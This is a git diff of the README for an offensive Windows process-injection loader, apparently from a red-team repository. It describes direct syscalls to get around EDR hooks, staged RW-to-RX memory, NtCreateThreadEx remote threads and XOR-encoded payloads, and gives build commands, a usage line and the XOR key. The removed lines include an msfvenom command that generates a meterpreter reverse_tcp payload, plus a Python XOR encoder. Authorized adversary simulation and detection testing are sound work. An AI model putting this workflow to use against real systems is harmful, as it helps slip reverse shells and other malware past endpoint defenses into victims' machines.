@@ -1,37 +1,132 @@
-# Direct Syscall Remote Thread Injector
+# Evasion
 
-This repository contains a low-level C++ reference template designed to evaluate cross-process execution security mechanics and user-mode endpoint telemetry resilience on modern Windows operating systems. The implementation avoids high-level API dependencies and mitigates persistent memory-scanning signatures by interacting directly with the native subsystem kernel boundary.
+## Direct Syscall Remote Thread Injector
 
-## Technical Architecture
+Windows x64 process-injection loader designed for **offensive security operations and adversary simulation**.
 
-The application coordinates three native subsystem primitives to manage memory allocation and execution states:
+### Features
 
-* **Native Kernel Interface Abstraction (Direct Syscalls):** The loader subverts user-mode api monitoring hooks deployed within `ntdll.dll` by standard security products. It leverages custom inline assembly stubs wrapped inside an explicit `extern "C"` linkage block to invoke native system services directly (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`).
-* **Sequential Page Protection Transitions:** To prevent the detection of persistent Read/Write/Execute (`RWX`) allocations during heuristic memory scans, the tool enforces granular page discipline. Memory regions are initialized with safe Read/Write (`PAGE_READWRITE`) permissions, populated with the stream payload, and subsequently transitioned to Execute/Read (`PAGE_EXECUTE_READ`) via `VirtualProtectEx` immediately prior to invocation.
-* **Isolated Runtime Thread Invocation:** The architecture avoids thread-hijacking and context-manipulation sequences (`NtGetContextThread`, `NtSetContextThread`) that commonly trip behavioral heuristic rules. The primary suspended thread of the target process remains unmanipulated. Code execution is handled by spawning an independent runtime background thread natively via `NtCreateThreadEx`.
+* Direct x64 system calls
+* User-mode security hook avoidance
+* Cross-process memory operations
+* Staged `RW → RX` memory protection
+* `NtCreateThreadEx` remote thread execution
+* Runtime XOR payload decoding
 
-## Environment Parameters
+---
 
-* **Compiler Toolchain:** MinGW-w64 / GCC Version 16.1.0+
-* **Development Shell:** MSYS2 UCRT64 Environment 
-* **Language Standard:** ISO C++17 Standard (`-std=c++17`)
-* **Target Platforms:** Native Windows 10 / 11 x64 Architecture
+## Execution Flow
 
-## Deployment Sequence
-
-```bash
-# 1. Generate abstract stageless payload blob
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LISTEN_IP LPORT=LISTEN_PORT -f raw -o raw.bin
-
-# 2. Obfuscate payload stream via a static 0xAA XOR loop
-python3 -c "data = open('raw.bin', 'rb').read(); open('enc.bin', 'wb').write(bytearray(b ^ 0xAA for b in data))"
-
-# 3. Compile multi-file dependencies natively via UCRT64
-g++ -o hollow.exe hollow.cpp evasion.cpp syscalls.cpp utils.cpp -municode -Wl,-subsystem,console -O2 -std=c++17 -static -fno-exceptions -fno-rtti
-
-# 4. Execute application binary wrapper against target image path
-.\hollow.exe --target C:\Windows\System32\notepad.exe --payload enc.bin
+```mermaid
+flowchart TD
+    A[Raw x64 Payload] --> B[XOR Encoding]
+    B --> C[Encoded Payload]
+    C --> D[Runtime Decode]
+    D --> E[NtAllocateVirtualMemory]
+    E --> F[PAGE_READWRITE]
+    F --> G[NtWriteVirtualMemory]
+    G --> H[NtProtectVirtualMemory]
+    H --> I[PAGE_EXECUTE_READ]
+    I --> J[NtCreateThreadEx]
+    J --> K[Payload Execution]
 ```
 
 ---
-Disclaimer: This repository is intended strictly for professional security research, educational telemetry validation, and authorized academic laboratory tracking purposes.
+
+## Red Team Use
+
+* Process injection during adversary simulation
+* User-mode security instrumentation testing
+* EDR detection validation
+* Memory and thread telemetry assessment
+* Process-injection technique comparison
+
+---
+
+## Build Requirements
+
+* Windows x64
+* C++17-compatible compiler
+* MSYS2 UCRT64 / MinGW-w64
+* Python 3.x
+
+### Windows
+
+Build using the MSYS2 UCRT64 environment:
+
+```bash
+g++ -o hollow.exe hollow.cpp evasion.cpp syscalls.cpp utils.cpp \
+    -O2 -std=c++17 -static -fno-exceptions -fno-rtti
+```
+
+### Cross Compilation
+
+```bash
+x86_64-w64-mingw32-g++ -o hollow.exe hollow.cpp evasion.cpp syscalls.cpp utils.cpp \
+    -O2 -std=c++17 -static -fno-exceptions -fno-rtti
+```
+
+---
+
+## Payload
+
+The loader accepts an externally prepared raw Windows x64 payload.
+
+The current encoding mechanism uses:
+
+```text
+XOR Key: 0xAA
+```
+
+Payload workflow:
+
+```mermaid
+flowchart LR
+    A[Raw Payload] --> B[XOR 0xAA]
+    B --> C[Encoded Payload]
+    C --> D[Evasion Loader]
+    D --> E[Runtime Decode]
+    E --> F[Injection]
+```
+
+---
+
+## Usage
+
+```text
+hollow.exe --target <target_process> --payload <encoded_payload>
+```
+
+---
+
+## Project Structure
+
+```text
+Evasion/
+│
+├── hollow.cpp
+├── evasion.cpp
+├── syscalls.cpp
+├── syscalls.h
+├── utils.cpp
+├── payload/
+│   └── ...
+│
+├── .gitignore
+└── README.md
+```
+
+---
+
+## Classification
+
+```text
+Platform  : Windows x64
+Technique : Remote Thread Process Injection
+Syscalls  : Direct Native System Calls
+Memory    : RW → RX
+Execution : NtCreateThreadEx
+Payload   : Runtime XOR Decoding
+```
+
+> **Scope:** Intended for controlled security testing, adversary simulation, and authorized environments.
